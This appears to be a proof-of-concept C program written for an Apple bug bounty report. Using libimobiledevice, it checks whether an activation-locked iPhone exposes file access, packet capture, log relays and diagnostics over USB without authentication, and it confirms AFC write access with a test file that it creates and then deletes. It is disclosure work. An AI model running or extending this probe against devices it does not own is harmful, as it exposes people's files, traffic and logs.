/*
 * 02-sensitive-services-locked-device: Multiple sensitive services accessible
 * on activation-locked iOS device without authentication.
 *
 * Apple Security Bounty research PoC.
 * Test device: iPhone 15 Pro (iPhone16,1), iOS 26.3 (23D127), personally
 * owned by the researcher and intentionally activation-locked for this
 * research. Not a general-purpose bypass tool -- this file demonstrates a
 * specific vulnerability for responsible disclosure to Apple under the
 * Apple Security Bounty Program (https://security.apple.com/bounty/).
 *
 * Companion writeup: submission/02-sensitive-services-locked-device/finding.md
 *
 * Build: make
 * Run:   ./poc
 * Deps:  libimobiledevice-1.0, libplist-2.0
 *        macOS:  brew install libimobiledevice
 *        Linux:  apt install libimobiledevice-dev || dnf install libimobiledevice-devel
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>

static const struct { const char *name; const char *desc; } SERVICES[] = {
    { "com.apple.afc",                        "file system read/write (/var/mobile/Media/)" },
    { "com.apple.pcapd",                      "WiFi packet capture"                        },
    { "com.apple.syslog_relay",               "system log streaming"                       },
    { "com.apple.os_trace_relay",             "OS trace log streaming"                     },
    { "com.apple.mobile.notification_proxy",  "notification dispatch"                      },
    { "com.apple.mobile.diagnostics_relay",   "device reboot / shutdown / sleep"           },
};
#define N_SERVICES  (sizeof(SERVICES) / sizeof(SERVICES[0]))

static const char *CONTROL_BLOCKED[] = {
    "com.apple.afc2",
    "com.apple.webinspector",
    "com.apple.mobile.installation_proxy",
};
#define N_BLOCKED  (sizeof(CONTROL_BLOCKED) / sizeof(CONTROL_BLOCKED[0]))

/* 1 = accessible, 0 = blocked / error */
static int probe_service(lockdownd_client_t ld, const char *svc_name)
{
    lockdownd_service_descriptor_t desc = NULL;
    lockdownd_error_t err = lockdownd_start_service(ld, svc_name, &desc);
    if (desc)
        lockdownd_service_descriptor_free(desc);
    return (err == LOCKDOWN_E_SUCCESS) ? 1 : 0;
}

/* 1 = write confirmed without auth */
static int probe_afc_write(idevice_t dev, lockdownd_client_t ld)
{
    lockdownd_service_descriptor_t desc = NULL;
    if (lockdownd_start_service(ld, "com.apple.afc", &desc) != LOCKDOWN_E_SUCCESS)
        return 0;

    afc_client_t afc = NULL;
    if (afc_client_new(dev, desc, &afc) != AFC_E_SUCCESS) {
        lockdownd_service_descriptor_free(desc);
        return 0;
    }
    lockdownd_service_descriptor_free(desc);

    uint64_t fd = 0;
    int ok = 0;
    /* AFC_FOPEN_WRONLY = O_WRONLY|O_CREAT|O_TRUNC; create is implicit */
    afc_error_t aerr = afc_file_open(afc, "/_bounty_write_test.bin",
                                     AFC_FOPEN_WRONLY, &fd);
    if (aerr == AFC_E_SUCCESS) {
        uint32_t written = 0;
        afc_file_write(afc, fd, "poc", 3, &written);
        afc_file_close(afc, fd);
        afc_remove_path(afc, "/_bounty_write_test.bin");
        ok = (written == 3);
    }
    afc_client_free(afc);
    return ok;
}

int main(void)
{
    idevice_t          dev = NULL;
    lockdownd_client_t ld  = NULL;
    int passes = 0;

    printf("Connecting to activation-locked device via USB...\n");

    if (idevice_new_with_options(&dev, NULL, IDEVICE_LOOKUP_USBMUX) != IDEVICE_E_SUCCESS) {
        fprintf(stderr, "ABORT: no USB device found -- connect the iOS device via USB\n");
        return 2;
    }

    char *udid = NULL;
    idevice_get_udid(dev, &udid);
    printf("Device:  %s\n\n", udid ? udid : "(unknown)");
    free(udid);

    /* lockdownd_client_new: no pairing / trust required on activation-locked device */
    if (lockdownd_client_new(dev, &ld, "poc-02") != LOCKDOWN_E_SUCCESS) {
        fprintf(stderr, "ABORT: lockdownd connection failed\n");
        idevice_free(dev);
        return 2;
    }

    printf("=== Vulnerable services (should be BLOCKED on locked device) ===\n");
    for (size_t i = 0; i < N_SERVICES; i++) {
        int ok = probe_service(ld, SERVICES[i].name);
        printf("  %-21s  %-44s  %s\n",
               ok ? "PASS (VULNERABLE)" : "FAIL (blocked)",
               SERVICES[i].name,
               SERVICES[i].desc);
        passes += ok;
    }

    printf("\n=== Control: correctly blocked services (validates test) ===\n");
    for (size_t i = 0; i < N_BLOCKED; i++) {
        int ok = probe_service(ld, CONTROL_BLOCKED[i]);
        printf("  %-21s  %s\n",
               ok ? "UNEXPECTED OPEN" : "CORRECTLY BLOCKED",
               CONTROL_BLOCKED[i]);
    }

    if (passes > 0) {
        int write_ok = probe_afc_write(dev, ld);
        printf("\nAFC write test: %s\n",
               write_ok
               ? "CONFIRMED -- created and deleted /_bounty_write_test.bin without auth"
               : "AFC accessible but write returned error");
    }

    printf("\nResult: %d/%zu sensitive services accessible without authentication\n",
           passes, N_SERVICES);
    printf("%s\n", passes > 0 ? "FINDING CONFIRMED" : "NOT CONFIRMED on this device/version");

    lockdownd_client_free(ld);
    idevice_free(dev);
    return passes > 0 ? 0 : 1;
}
